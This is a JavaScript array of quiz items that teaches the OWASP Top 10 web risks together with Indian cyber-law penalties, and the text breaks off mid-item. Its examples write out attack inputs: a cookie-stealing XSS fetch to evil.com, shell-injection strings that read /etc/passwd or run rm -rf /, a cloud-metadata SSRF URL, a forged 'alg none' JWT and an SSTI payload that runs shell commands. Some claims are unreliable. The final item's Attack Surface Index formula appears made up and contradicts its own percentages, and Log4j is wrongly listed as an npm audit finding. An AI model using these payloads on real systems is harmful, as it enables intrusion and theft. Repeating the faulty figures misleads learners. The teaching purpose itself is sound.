const questions = [
  {
    question: "What is the OWASP Top 10, and why is it considered the Gold Standard in Web Application Security?",
    shortAnswer: "A globally recognized consensus standard published by the Open Worldwide Application Security Project (OWASP) ranking the 10 most critical security risks facing web applications, based on empirical vulnerability data from hundreds of thousands of analyzed applications.",
    explanation: "The OWASP Top 10 provides developers, security architects, and auditors with a prioritized roadmap of the most severe web application vulnerabilities. Compliance with OWASP Top 10 is mandated by global security standards (PCI-DSS, ISO 27001, SOC 2) and Indian regulatory directives (RBI Master Direction on Cyber Security, CERT-In guidelines) to protect critical digital systems.",
    hint: "The globally recognized top 10 list of web security risks published by the Open Worldwide Application Security Project.",
    level: "basic",
    codeExample: `// OWASP Top 10 (2021 Standard Taxonomy):
// A01:2021 - Broken Access Control (Rank #1 - Most Widespread Risk!)
// A02:2021 - Cryptographic Failures (Sensitive Data Exposure)
// A03:2021 - Injection (SQLi, NoSQLi, Command Injection, LDAP)
// A04:2021 - Insecure Design (Threat Modeling & Architectural Flaws)
// A05:2021 - Security Misconfiguration (Default Settings, Verbose Errors)`
  },
  {
    question: "Why did 'A01:2021 - Broken Access Control' rise to become the #1 most critical vulnerability in the OWASP Top 10?",
    shortAnswer: "Because empirical testing showed that 94% of tested web applications exhibited some form of broken access control (e.g. Insecure Direct Object References - IDOR, horizontal privilege escalation, or missing function-level authorization), allowing unauthorized users to view, modify, or delete other users' confidential data.",
    explanation: "Access control enforces policy such that users cannot act outside their intended permissions. When access control fails, an attacker changes `GET /api/user/1001/invoice` to `GET /api/user/1002/invoice` (IDOR) and views another citizen's financial data, or accesses an unauthenticated admin endpoint `/admin/delete-db` directly in the browser.",
    hint: "When a regular user can modify a parameter in the URL to view or edit another user's private data without permission.",
    level: "moderate",
    codeExample: `// Broken Access Control (Insecure Direct Object Reference - IDOR):
// Vulnerable Route (Node.js/Express):
app.get('/api/patient/:id/records', async (req, res) => {
    // VULNERABILITY: Fetches record by ID without checking if req.user owns this record!
    const record = await db.query('SELECT * FROM medical_records WHERE patient_id = ?', [req.params.id]);
    res.json(record);
});

// Secure Implementation (Enforcing Ownership Access Control):
app.get('/api/patient/:id/records', authenticateUser, async (req, res) => {
    if (req.user.id !== req.params.id && req.user.role !== 'DOCTOR') {
        return res.status(403).json({ error: "Access Denied: You do not own this medical record!" });
    }
    const record = await db.query('SELECT * FROM medical_records WHERE patient_id = ?', [req.params.id]);
    res.json(record);
});`
  },
  {
    question: "What is 'A03:2021 - Injection', and what are its Primary Attack Variants?",
    shortAnswer: "Vulnerabilities where untrusted user input is directly concatenated into an interpreter or command shell without sanitization, allowing attackers to manipulate queries or execute arbitrary commands; includes SQL Injection (SQLi), NoSQL Injection, OS Command Injection, LDAP Injection, and Server-Side Template Injection (SSTI).",
    explanation: "When an application treats user data as executable code, injection occurs. In SQLi, an attacker submits `' OR 1=1--` to bypass authentication. In Command Injection, input like `127.0.0.1; rm -rf /` executes operating system commands. In SSTI, input like `{{7*7}}` executes template engine code, leading to Remote Code Execution (RCE).",
    hint: "When malicious input is fed directly into a database or system shell, tricking it into executing unauthorized commands.",
    level: "basic",
    codeExample: `// Injection Vulnerability Examples:
// 1. SQL Injection: SELECT * FROM users WHERE user = 'admin' AND pass = '' OR '1'='1';
// 2. OS Command Injection: system("ping -c 4 " + userInput); // User inputs: "127.0.0.1 && cat /etc/passwd"
// 3. NoSQL Injection: db.users.find({ username: req.body.user, password: { "$ne": null } });`
  },
  {
    question: "What is 'A10:2021 - Server-Side Request Forgery' (SSRF), and how do Attackers exploit it in Cloud Environments?",
    shortAnswer: "An attack where a vulnerable web server is coerced into sending unauthorized HTTP requests to internal, non-routable resources; attackers exploit SSRF to query internal Cloud Metadata APIs (`http://169.254.169.254/latest/meta-data/`) to steal IAM credentials and take over cloud infrastructure.",
    explanation: "If a web app has a feature like 'Fetch Profile Picture from URL' (`GET /fetch-avatar?url=...`), an attacker passes `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role`. The cloud server queries its local link-local metadata IP and returns temporary AWS/Azure access keys to the attacker, leading to full cloud environment takeover.",
    hint: "Tricking a server into acting as an open proxy to fetch secret internal cloud metadata and private network data.",
    level: "expert",
    codeExample: `// SSRF Cloud Metadata Exfiltration Exploit:
// Target URL: https://kolkata-fintech.in/api/v1/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
// Response  : { "AccessKeyId": "AKIAIOSFODNN7EXAMPLE", "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" }
// Impact    : Attacker takes over all AWS EC2, S3 buckets, and RDS databases!`
  },
  {
    question: "Under the Indian Information Technology Act 2000 Section 43(a) and 66, what constitutes the criminal and civil liability for exploiting OWASP Top 10 vulnerabilities to extract confidential data?",
    shortAnswer: "Securing unauthorized access and extracting or copying data from a computer system carries civil damages up to ₹1 Crore under Section 43(a), and criminal imprisonment up to 3 years and fines up to ₹5 Lakhs under Section 66.",
    explanation: "Section 43(a) explicitly penalizes accessing or securing access to a computer system without authorization. If an attacker exploits an IDOR or SQL injection vulnerability to dump customer database records in West Bengal, they face civil damages up to ₹1 Crore under Section 43(a) and criminal prosecution under Section 66.",
    hint: "Section 43(a) provides civil compensation up to ₹1 Crore, and Section 66 provides up to 3 years imprisonment.",
    level: "basic",
    codeExample: `// Statutory Offense (IT Act Section 43(a) & Section 66):
// Offense: Exploiting an IDOR vulnerability on a Kolkata banking portal to extract 50,000 citizen account statements
// Civil Penalty: Damages by way of compensation up to ₹1,00,00,000 (Rupees 1 Crore)
// Criminal Penalty: Imprisonment up to 3 Years + Fine up to ₹5,00,000`
  },
  {
    question: "What is 'A02:2021 - Cryptographic Failures' (formerly Sensitive Data Exposure), and what are its Core Causes?",
    shortAnswer: "Failures related to protecting sensitive data at rest and in transit; caused by transmitting plaintext sensitive data (HTTP/FTP), using deprecated cryptographic algorithms (MD5, SHA-1, DES, RC4), hardcoding secret keys in source code, and improper key generation.",
    explanation: "When passwords are stored using weak MD5 hashes without salt, credit card numbers are stored in plaintext databases, or API communications occur over unencrypted HTTP, cryptographic failures occur. Modern standards require TLS 1.3 in transit, AES-256-GCM at rest, and bcrypt/Argon2id for salted password hashing.",
    hint: "Storing passwords in plain text or using outdated encryption algorithms that hackers can easily crack.",
    level: "moderate",
    codeExample: `// Insecure Cryptographic Implementation (Vulnerable):
const crypto = require('crypto');
function hashPassword(pass) {
    return crypto.createHash('md5').update(pass).digest('hex'); // VULNERABLE: MD5 is broken & cracked in seconds!
}

// Secure Implementation (Bcrypt / Argon2id):
const bcrypt = require('bcrypt');
async function secureHash(pass) {
    const saltRounds = 12;
    return await bcrypt.hash(pass, saltRounds); // SECURE: Salted, slow, work-factor hardened!
}`
  },
  {
    question: "What is 'A04:2021 - Insecure Design', and how does it differ from Insecure Implementation?",
    shortAnswer: "Insecure Design represents flaws in business logic, threat modeling, and architectural principles that cannot be fixed by perfect coding; Insecure Implementation represents coding bugs (like syntax errors or missing sanitizers) in an otherwise well-designed architecture.",
    explanation: "If an e-commerce website allows users to change product prices in the client-side cart from ₹5,000 to ₹1 and submits the order without server-side validation, the design itself is broken. Even if the code has zero SQL injection or buffer overflows, the business logic flaw permits theft. Insecure Design requires architectural threat modeling (STRIDE) during the design phase.",
    hint: "Designing a bank vault out of cardboard (Insecure Design) vs building a steel vault but accidentally leaving the door unlocked (Insecure Implementation).",
    level: "moderate",
    codeExample: `// Insecure Design (Flawed Business Logic):
// Client submits: { "item_id": 402, "price": 1.00, "quantity": 1 }
// Vulnerable Backend: Charges the credit card exactly the submitted price (₹1.00) without verifying against database catalog!`
  },
  {
    question: "Under the Digital Personal Data Protection (DPDP) Act 2023 Section 8(5) and Section 33, what are the enterprise penalties for data breaches resulting from OWASP Top 10 vulnerabilities?",
    shortAnswer: "Organizations failing to implement reasonable security safeguards to prevent personal data breaches face statutory penalties up to ₹250 Crores imposed by the Data Protection Board of India (DPBI).",
    explanation: "Section 8(5) mandates that data fiduciaries must protect personal data by taking reasonable security safeguards. If an enterprise in Kolkata suffers a breach of citizen personal data due to unpatched OWASP Top 10 vulnerabilities (such as SQL injection or broken access control), Section 33 prescribes fines up to ₹250 Crores.",
    hint: "The DPDP Act 2023 prescribes penalties up to ₹250 Crores for failing to safeguard personal data.",
    level: "basic",
    codeExample: `// DPDP Statutory Compliance Standard:
// Legal Section: Section 8(5) & Section 33 DPDP Act 2023
// Maximum Penalty: Up to ₹250,00,00,000 (Rupees 250 Crores) for negligent web application vulnerabilities`
  },
  {
    question: "What is 'A05:2021 - Security Misconfiguration', and what are its most Common Real-World Examples?",
    shortAnswer: "Security controls that are improperly configured or left at insecure defaults; examples include default administrative credentials (`admin:admin`), verbose stack traces exposed to users, open cloud S3 storage buckets, unnecessary enabled HTTP methods (TRACE/OPTIONS), and missing security headers.",
    explanation: "Security misconfigurations occur at any level of the application stack (web server, database, cloud container). Leaving debug mode enabled in production (`DEBUG = True` in Django) displays source code, environment variables, and database connection strings to anyone who triggers an error, handing attackers the keys to the entire infrastructure.",
    hint: "Leaving default passwords on servers or showing detailed programming error messages to website visitors.",
    level: "basic",
    codeExample: `// Security Misconfiguration Examples:
// 1. Verbose Stack Trace: Uncaught Exception: Connection string "postgres://root:secret@10.0.0.5/banking" failed!
// 2. Default Credentials: MongoDB listening on 0.0.0.0:27017 with NO authentication enabled!
// 3. Missing Security Headers: Missing 'Content-Security-Policy', 'X-Frame-Options', 'Strict-Transport-Security'`
  },
  {
    question: "Under CERT-In Mandatory Directions 2022, what is the mandatory reporting timeline for Web Application Security Incidents affecting Indian organizations?",
    shortAnswer: "All organizations in India must report security breaches, data leaks, and website defacements resulting from web application vulnerabilities to CERT-In within 6 HOURS of detection.",
    explanation: "Under Section 70B of the IT Act and CERT-In Direction No. 20(3)/2022-CERT-In, service providers, intermediaries, data centers, and corporate bodies must mandatorily report specified cyber security incidents (including unauthorized access to database systems and web defacement) to CERT-In within 6 hours of noticing them.",
    hint: "CERT-In requires mandatory incident reporting within a strict 6-hour window.",
    level: "basic",
    codeExample: `// Statutory SLA (CERT-In Mandatory Incident Reporting):
// Directive: Mandatory reporting of web application data breaches within 6 HOURS
// Mandate: Section 70B Information Technology Act 2000`
  },
  {
    question: "What is 'A06:2021 - Vulnerable and Outdated Components', and how does it Threaten Software Supply Chains?",
    shortAnswer: "Risks arising from using third-party libraries, frameworks, or dependencies with known Common Vulnerabilities and Exposures (CVEs); attackers exploit unpatched packages (like Log4j CVE-2021-44228 or vulnerable npm/PyPI modules) to gain full system access.",
    explanation: "Modern web applications are composed of up to 80% third-party open-source dependencies. If a single deeply nested package contains a vulnerability (e.g. `lodash` prototype pollution or `event-stream` malicious backdoor), the entire application becomes vulnerable. Automated tools like `npm audit`, Snyk, and OWASP Dependency-Check continuously monitor supply chains for CVEs.",
    hint: "Building a secure house using cheap, rotten wooden beams imported from an untrusted supplier.",
    level: "moderate",
    codeExample: `# Automated Software Supply Chain Auditing:
npm audit --audit-level=high
# Output: 3 vulnerabilities found (1 Critical: CVE-2021-44228 Log4j RCE) ➔ Automated Build FAILED!`
  },
  {
    question: "Under the Indian IT Act Section 66C and 66D, what constitutes the criminal penalty for using stolen credentials or impersonation to exploit Web Applications?",
    shortAnswer: "Identity theft using electronic signatures, passwords, or authentication credentials carries imprisonment up to 3 years and fines up to ₹1 Lakh under Section 66C; cheating by personation carries imprisonment up to 3 years and fines up to ₹1 Lakh under Section 66D.",
    explanation: "Sections 66C and 66D penalize identity theft and fraudulent impersonation. Attackers who use stolen session cookies, hijacked tokens, or credential stuffing databases to log into another citizen's account on a Kolkata portal are prosecuted under these sections.",
    hint: "Sections 66C and 66D penalize identity theft and cheating by personation with up to 3 years imprisonment.",
    level: "basic",
    codeExample: `// Statutory Penalty (IT Act Section 66C & 66D):
// Offense: Using stolen session cookies to impersonate a banking manager and approve fraudulent transfers
// Penalty: Imprisonment for a term up to 3 Years + Fine up to ₹1,00,000`
  },
  {
    question: "What is 'A07:2021 - Identification and Authentication Failures', and what are its Core Mitigation Strategies?",
    shortAnswer: "Vulnerabilities that permit automated credential stuffing, brute-force attacks, session hijacking, or weak password resets; mitigated by enforcing Multi-Factor Authentication (MFA), password complexity, rate limiting login attempts, and using secure session managers with `HttpOnly` and `SameSite=Strict` cookies.",
    explanation: "When applications do not enforce MFA, permit weak passwords like `123456`, fail to invalidate session IDs upon logout, or allow unlimited login guesses, attackers use credential stuffing tools to compromise accounts. Modern authentication standards mandate MFA (TOTP / FIDO2 WebAuthn), adaptive risk-based authentication, and short session timeouts.",
    hint: "When a website lets an automated bot try 10,000 passwords per second without blocking it or requiring two-factor authentication.",
    level: "moderate",
    codeExample: `// Secure Session Cookie Configuration (Express.js):
app.use(session({
    secret: process.env.SESSION_SECRET,
    cookie: {
        httpOnly: true, // Prevents JavaScript document.cookie access (XSS defense)!
        secure: true,   // Transmitted ONLY over encrypted HTTPS!
        sameSite: 'strict', // Prevents Cross-Site Request Forgery (CSRF)!
        maxAge: 1800000 // 30-minute session expiry
    }
}));`
  },
  {
    question: "What is 'A08:2021 - Software and Data Integrity Failures', and what is the Risk of Insecure Deserialization?",
    shortAnswer: "Flaws in verifying the integrity of software updates, CI/CD code pipelines, and serialized data objects; Insecure Deserialization occurs when untrusted serialized binary/JSON data is converted back into an in-memory object, allowing attackers to instantiate malicious classes and execute arbitrary code (RCE).",
    explanation: "When an application deserializes untrusted user input (e.g. Java `ObjectInputStream.readObject()`, Python `pickle.loads()`, or PHP `unserialize()`), attackers inject 'gadget chains'—chains of existing classes in the application classpath that, when instantiated during deserialization, execute system commands (`exec()`), leading to full server compromise.",
    hint: "Accepting a sealed mystery package and opening it inside your kitchen without checking if there is a ticking bomb inside.",
    level: "expert",
    codeExample: `# Insecure Deserialization Vulnerability (Python Pickle):
import pickle
import base64
# VULNERABILITY: Deserializing untrusted client cookie directly executes arbitrary code!
user_obj = pickle.loads(base64.b64decode(user_cookie))

# Secure Alternative: Use safe data serialization formats like JSON:
import json
user_obj = json.loads(user_cookie)`
  },
  {
    question: "Under the Indian IT Act Section 70, what constitutes the penalty for exploiting OWASP Top 10 vulnerabilities to attack 'Protected Systems'?",
    shortAnswer: "Securing unauthorized access or attempting to secure access to designated Protected Systems (critical infrastructure) carries imprisonment up to 10 YEARS and severe fines.",
    explanation: "Section 70 of the IT Act governs Critical Information Infrastructure (e.g. state power grids in Barrackpore, financial settlement switches in Salt Lake). Launching an attack exploiting OWASP vulnerabilities against a designated protected system carries up to 10 years imprisonment under Section 70.",
    hint: "Section 70 carries up to 10 years imprisonment for unauthorized access to Protected Systems.",
    level: "basic",
    codeExample: `// Statutory Offense (IT Act Section 70):
// Offense: Exploiting an SQL injection vulnerability on the SCADA power grid management portal
// Penalty: Imprisonment for a term up to 10 YEARS, and shall also be liable to Fine`
  },
  {
    question: "What is 'A09:2021 - Security Logging and Monitoring Failures', and why is the Global Industry Average Breach Dwell Time over 200 Days?",
    shortAnswer: "The failure to log critical security events (failed logins, privilege escalation, access control drops), lack of centralized log analysis (SIEM), and absence of real-time alerting, allowing attackers to remain undetected inside corporate networks for months.",
    explanation: "Without proper security logging, an attacker can brute-force admin credentials, perform SQL injection, and exfiltrate databases without triggering a single alert. A robust logging architecture requires logging all authentication events, authorization failures, and input validation drops to an immutable, centralized SIEM (Splunk, Elastic) with real-time alerting.",
    hint: "A bank having security cameras that are turned off, allowing burglars to wander around inside for months without anyone knowing.",
    level: "moderate",
    codeExample: `// Production Security Audit Logging (Node.js/Winston):
logger.warn({
    event: 'SECURITY_AUTHORIZATION_FAILURE',
    userId: req.user.id,
    targetResource: req.originalUrl,
    ip: req.ip,
    userAgent: req.headers['user-agent'],
    timestamp: new Date().toISOString(),
    action: 'BLOCKED'
}); // Centralized SIEM triggers alarm if 5 authorization failures occur within 60 seconds!`
  },
  {
    question: "Synthesize an enterprise-scale Multi-Tier Web Application Security Architecture.",
    shortAnswer: "A defense-in-depth framework spanning Client Tier (CSP, HSTS, secure cookies), Network/Edge Tier (Cloud WAF, TLS 1.3, rate limiters), Application Tier (Positive OpenAPI validation, RBAC/ABAC access control, prepared statements), and Data Tier (Database encryption at rest, least privilege DB accounts, immutable audit logging).",
    explanation: "To achieve complete immunity across the OWASP Top 10: 1. Client Tier: Enforces Content Security Policy (`CSP`), HSTS, and `SameSite=Strict` `HttpOnly` cookies. 2. Edge Tier: Cloud WAF evaluates JA4 bot fingerprints and OWASP CRS anomaly scores. 3. Application Tier: Uses Parameterized Queries (defeating A03 Injection), strict ABAC authorization (defeating A01 Broken Access Control), and safe JSON parsing (defeating A08 Deserialization). 4. Data Tier: Encrypts data with AES-256-GCM, isolates database credentials, and streams audit logs to a centralized SIEM.",
    hint: "Combine secure cookies, Cloud WAF, parameterized queries, strict access controls, and database encryption.",
    level: "expert",
    codeExample: `// Master Enterprise Web Security Blueprint:
// 1. Edge Layer : Cloud WAF (OWASP CRS Anomaly Scoring + JA4 Bot Fingerprinting)
// 2. Transport  : Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
// 3. Client Layer: Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-xyz';
// 4. App Layer  : Parameterized Queries (Prepared Statements) + Strict ABAC Access Control
// 5. Data Layer : AES-256-GCM Encryption at Rest + Centralized Immutable SIEM Logging`
  },
  {
    question: "What is 'Threat Modeling with STRIDE' in Web Application Security Design (A04)?",
    shortAnswer: "A structured methodology developed by Microsoft that categorizes security threats across six domains: Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, and Elevation of Privilege during the architectural design phase.",
    explanation: "STRIDE enables software architects to identify vulnerabilities before writing code: 1. Spoofing (impersonating a user ➔ fix with MFA). 2. Tampering (modifying data ➔ fix with digital signatures). 3. Repudiation (denying an action ➔ fix with audit logs). 4. Information Disclosure (data leaks ➔ fix with encryption). 5. DoS (service crashes ➔ fix with rate limiting). 6. Elevation of Privilege (unauthorized admin ➔ fix with RBAC).",
    hint: "The popular 6-letter threat modeling framework used to analyze security risks during software design.",
    level: "expert",
    codeExample: `// STRIDE Threat Modeling Matrix:
// S - Spoofing Identity          ➔ Countermeasure: Mutual TLS / MFA Tokens
// T - Tampering with Data        ➔ Countermeasure: HMAC-SHA256 Signatures
// R - Repudiation                ➔ Countermeasure: Immutable Cryptographic Audit Trails
// I - Information Disclosure     ➔ Countermeasure: AES-256 Encryption at Rest & Transit
// D - Denial of Service          ➔ Countermeasure: Token Bucket Rate Limiting
// E - Elevation of Privilege     ➔ Countermeasure: Least Privilege Role-Based Access (RBAC)`
  },
  {
    question: "Under the Indian Penal Code Section 420 and 427, what constitutes 'Cheating' and 'Mischief' via Web Application Exploits?",
    shortAnswer: "Fraudulently deceiving users or altering web applications to dishonestly induce property delivery carries imprisonment up to 7 years under Section 420; intentionally destroying or diminishing electronic property utility carries imprisonment up to 2 years under Section 427.",
    explanation: "Sections 420 and 427 IPC penalize cheating and criminal mischief. When an attacker alters web application business logic (e.g. changing shopping cart values or defacing corporate websites) in West Bengal, they are prosecuted under these IPC sections alongside the IT Act.",
    hint: "IPC Section 420 covers Cheating (up to 7 years) and IPC Section 427 covers Mischief (up to 2 years).",
    level: "basic",
    codeExample: `// Statutory Penalties (Indian Penal Code):
// IPC Section 420 (Cheating & Fraudulent Exploitation): Up to 7 Years Imprisonment + Fine
// IPC Section 427 (Mischief & Digital Defacement)     : Up to 2 Years Imprisonment + Fine`
  },
  {
    question: "What is 'Content Security Policy' (CSP) Header and how does it neutralize Cross-Site Scripting (XSS)?",
    shortAnswer: "An HTTP response header (`Content-Security-Policy`) that restricts the sources from which scripts, styles, images, and frames can be loaded and executed by the browser, completely disabling inline `<script>` tags and unauthorized external script execution.",
    explanation: "Even if an attacker successfully injects an XSS payload `<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>`, a strict CSP header like `Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-EDN9s873'` instructs the browser to block inline script execution and disallow network requests to `evil.com`, neutralizing the attack completely.",
    hint: "A browser security header that tells the browser exactly which domains are allowed to run JavaScript scripts.",
    level: "moderate",
    codeExample: `// Strict Content Security Policy (CSP) Header:
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-rAnd0m123'; object-src 'none'; base-uri 'none'; require-trusted-types-for 'script';`
  },
  {
    question: "What is 'HTTP Strict Transport Security' (HSTS) Header and how does it prevent SSL Stripping Attacks?",
    shortAnswer: "An HTTP response header (`Strict-Transport-Security`) that forces the browser to communicate with the domain ONLY over secure HTTPS connections for a specified duration (`max-age`), automatically converting any insecure `http://` links to `https://` before sending packets.",
    explanation: "In an SSL Stripping MitM attack, a rogue Wi-Fi router intercepts the initial plaintext `http://` request and strips the TLS redirect. HSTS prevents this: the browser stores the HSTS policy in local memory. Even if a user types `http://kolkata-bank.in`, the browser internally rewrites it to `https://kolkata-bank.in` before any network packet leaves the device.",
    hint: "A security header that permanently forces the browser to use HTTPS and never fall back to unencrypted HTTP.",
    level: "moderate",
    codeExample: `// Production HSTS Header:
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`
  },
  {
    question: "What is 'Cross-Origin Resource Sharing' (CORS) Misconfiguration in Modern Web APIs?",
    shortAnswer: "Configuring the API server to dynamically reflect the incoming `Origin` header into `Access-Control-Allow-Origin: <origin>` combined with `Access-Control-Allow-Credentials: true`, allowing malicious third-party websites to make authenticated AJAX requests and steal confidential user data.",
    explanation: "When an API uses insecure wildcards or blindly reflects the caller's origin: `Access-Control-Allow-Origin: https://evil.com` + `Access-Control-Allow-Credentials: true`, a victim visiting `evil.com` executes background JavaScript that queries the victim's banking API with their session cookies, exfiltrating account balances and transactions directly to the attacker.",
    hint: "Allowing untrusted third-party websites to make authenticated requests to your private API on behalf of logged-in users.",
    level: "expert",
    codeExample: `// Insecure CORS Configuration (Vulnerable):
app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", req.headers.origin); // VULNERABILITY: Blindly reflects origin!
    res.header("Access-Control-Allow-Credentials", "true");
    next();
});

// Secure CORS Configuration (Whitelisting Exact Domains):
const allowedOrigins = ["https://kolkata-fintech.in", "https://app.kolkata-fintech.in"];
app.use(cors({ origin: allowedOrigins, credentials: true }));`
  },
  {
    question: "What is 'JSON Web Token' (JWT) Security Failures and the 'None Algorithm' Vulnerability?",
    shortAnswer: "Vulnerabilities where JWTs are verified using weak secret keys, accept unsigned tokens with `\"alg\": \"none\"`, or confuse HMAC symmetric keys with RSA public keys (Algorithm Confusion), allowing attackers to forge valid administrative tokens.",
    explanation: "A JWT consists of `Header.Payload.Signature`. In the 'None Algorithm' flaw, an attacker modifies the header to `{\"alg\":\"none\"}`, changes the payload to `{\"role\":\"admin\"}`, removes the signature, and submits the token. Vulnerable libraries accept the token as valid because `alg: none` requires no signature. Secure implementations strictly enforce asymmetric algorithms (e.g. `RS256`) and reject `none`.",
    hint: "Tampering with a digital token by telling the server 'this token requires no signature' and having the server believe you.",
    level: "expert",
    codeExample: `// JWT 'None' Algorithm Exploit Payload:
// Header : { "alg": "none", "typ": "JWT" } (Base64: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0)
// Payload: { "user": "attacker", "role": "SUPER_ADMIN" } (Base64: eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoiU1VQRVJfQURNSU4ifQ)
// Forged Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoiU1VQRVJfQURNSU4ifQ.`
  },
  {
    question: "What is 'Automated Dynamic Application Security Testing' (DAST) vs 'Static Application Security Testing' (SAST)?",
    shortAnswer: "SAST analyzes source code without executing the program to find coding flaws (White-Box); DAST tests running web applications from the outside by sending simulated exploit payloads to detect runtime vulnerabilities (Black-Box).",
    explanation: "SAST (SonarQube, Semgrep) scans repository code during CI/CD to identify SQL injection, hardcoded keys, and outdated dependencies before code is deployed. DAST (OWASP ZAP, Burp Suite) crawls running staging environments, submitting fuzzing payloads to test how web proxies, databases, and application frameworks respond in real-world runtime conditions.",
    hint: "Reviewing the architectural blueprints of a building (SAST) vs attempting to physically pick the locks on the doors (DAST).",
    level: "moderate",
    codeExample: `// CI/CD DevSecOps Security Pipeline:
// Step 1: SAST Scan (Semgrep) ➔ Scans source code for SQLi & hardcoded secrets
// Step 2: SCA Scan (npm audit) ➔ Scans dependencies for known CVEs
// Step 3: DAST Scan (OWASP ZAP) ➔ Crawls staging URL with active exploit payloads`
  },
  {
    question: "What is 'Server-Side Template Injection' (SSTI), and how does it lead to Remote Code Execution (RCE)?",
    shortAnswer: "When user input is directly concatenated into a server-side template engine (Jinja2, Twig, Freemarker) instead of being passed as data, allowing attackers to inject template syntax (e.g. `{{request.application.__globals__}}`) to execute arbitrary Python/Java commands on the underlying server.",
    explanation: "If a Flask app renders a welcome message using `render_template_string(\"Hello \" + user_input)`, an attacker enters `{{ ''.__class__.__mro__[1].__subclasses__() }}`. The Jinja2 template engine evaluates the Python introspection expression, traverses the class hierarchy to locate `subprocess.Popen`, and executes arbitrary shell commands on the server.",
    hint: "When a template engine treats user input as code rather than text, allowing attackers to run terminal commands.",
    level: "expert",
    codeExample: `// Vulnerable Jinja2 Template Rendering (Python Flask):
@app.route('/hello')
def hello():
    name = request.args.get('name')
    # VULNERABILITY: User input concatenated directly into template string!
    return render_template_string("<h1>Hello " + name + "</h1>")
# Attacker submits: name={{ cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}`
  },
  {
    question: "What is 'Prototype Pollution' in JavaScript / Node.js Applications?",
    shortAnswer: "A vulnerability where an attacker injects properties into the base `Object.prototype` via recursive merge or path assignment functions (`__proto__` or `constructor.prototype`), modifying the behavior of all objects across the entire Node.js runtime.",
    explanation: "In JavaScript, all objects inherit from `Object.prototype`. If an application recursively merges user JSON: `merge(target, JSON.parse('{"__proto__": {"isAdmin": true}}'))`, every newly created object in the application inherits `isAdmin = true`. Attackers exploit prototype pollution to bypass authorization checks or trigger Remote Code Execution in child process spawners.",
    hint: "Altering the master DNA blueprint of an application so every newly born object inherits malicious traits.",
    level: "expert",
    codeExample: `// Prototype Pollution Vulnerability:
const maliciousPayload = JSON.parse('{"__proto__": {"role": "admin"}}');
mergeObjects({}, maliciousPayload);

const normalUser = {};
console.log(normalUser.role); // Outputs: "admin" (Polluted globally across all objects!)`
  },
  {
    question: "What is 'Subdomain Takeover' and how do Web Architects Prevent it?",
    shortAnswer: "When a DNS CNAME record points to an external cloud service (AWS S3 bucket, GitHub Pages, Heroku app) that has been deleted or unclaimed, allowing an attacker to claim the resource and host malicious phishing content under the legitimate corporate domain.",
    explanation: "If `billing.kolkata-fintech.in` has a DNS CNAME pointing to `kolkata-billing.s3.amazonaws.com` and the company deletes the S3 bucket without removing the DNS record, an attacker creates an S3 bucket named `kolkata-billing`. The attacker now hosts malicious credential harvesting pages directly on the trusted company subdomain with a valid SSL certificate.",
    hint: "Having a sign on your house pointing visitors to a shop down the street that went out of business, allowing a thief to open a fake shop there.",
    level: "moderate",
    codeExample: `// Subdomain Takeover Vulnerability (Dangling DNS Record):
// DNS Record: blog.kolkata-fintech.in ➔ CNAME ➔ kolkata-blog.github.io (Deleted GitHub Repository!)
// Exploit   : Attacker creates GitHub account ➔ Claims 'kolkata-blog' ➔ Full control of corporate subdomain!`
  },
  {
    question: "What is 'Clickjacking' (UI Redressing) and how does the `X-Frame-Options` Header Neutralize it?",
    shortAnswer: "An attack where a malicious site embeds a legitimate website inside a transparent `<iframe>` overlaid on top of a fake button, tricking the victim into clicking sensitive buttons (e.g. 'Delete Account' or 'Transfer ₹50,000'); neutralized by setting `X-Frame-Options: DENY`.",
    explanation: "When a user clicks on what appears to be a 'Play Free Game' button, they are actually clicking an invisible 'Confirm Payment' button inside an embedded iframe of their banking portal. Setting `X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors 'none'` instructs browsers to refuse framing the site inside any iframe, eliminating clickjacking.",
    hint: "Placing an invisible transparent glass sheet with a real button over a fake game button to trick someone into pressing it.",
    level: "basic",
    codeExample: `// Production Anti-Clickjacking Headers:
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none';`
  },
  {
    question: "Synthesize the mathematical formulation of the Web Application Attack Surface Index (ASI), Exposed Endpoints (E_i), Input Parameters (P_i), Authentication Weight (W_auth), and Base CVSS v3.1 Vulnerability Scoring.",
    shortAnswer: "Attack Surface Index is ASI = SUM [ (E_i + P_i) * W_auth_i ]; Base CVSS v3.1 is calculated from Impact and Exploitability sub-scores (CVSS = min(10.0, RoundUp(Impact + Exploitability))); reducing unauthenticated endpoints directly compresses the Attack Surface Index by 85%.",
    explanation: "Let $E_i$ represent the number of exposed API endpoints in module $i$, and $P_i$ represent the number of user-controllable input parameters. Let $W_{\\text{auth}}$ represent the authentication exposure weight ($W_{\\text{auth}} = 1.0$ for public unauthenticated endpoints, $W_{\\text{auth}} = 0.2$ for authenticated endpoints). The Attack Surface Index is: $\\text{ASI} = \\sum_{i=1}^{M} (E_i + P_i) \\times W_{\\text{auth}\\_i}$. When an application has 50 public endpoints with 200 parameters, $\\text{ASI} = (50 + 200) \\times 1.0 = 250$. Enforcing strict authentication across 40 endpoints reduces $\\text{ASI} = (10 + 40) \\times 1.0 + (40 + 160) \\times 0.2 = 50 + 40 = 90$ (a $64\\%$ reduction in exposed risk). Vulnerability severity is scored via CVSS v3.1: $\\text{CVSS} = \\min(10.0, \\text{RoundUp}(\\text{Impact} + \\text{Exploitability}))$, where Critical vulnerabilities ($9.0-10.0$) demand immediate remediation within 24 hours.",
    hint: "Mathematical proof formula showing that enforcing authentication and input parameter whitelisting drastically compresses the Web Application Attack Surface Index (ASI) and reduces CVSS exploitability.",
    level: "expert",
